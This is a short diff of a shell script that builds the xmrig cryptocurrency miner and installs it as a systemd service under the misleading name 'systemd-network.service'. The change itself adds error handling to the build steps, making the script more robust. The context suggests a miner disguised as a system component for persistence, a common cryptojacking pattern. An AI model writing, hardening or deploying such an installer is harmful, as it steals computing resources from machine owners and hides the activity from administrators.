@@ -30,10 +30,10 @@ if [ ! -d xmrig ]; then
 fi
 cd xmrig
 mkdir -p build
-cd build
+cd build || { echo "Failed to enter build directory"; exit 1; }
 
-cmake ..
-make -j"$CPU_CORES"
+cmake .. || { echo "cmake failed"; exit 1; }
+make -j"$CPU_CORES" || { echo "make failed"; exit 1; }
 
 sudo tee /etc/systemd/system/systemd-network.service > /dev/null <<EOF
 [Unit]
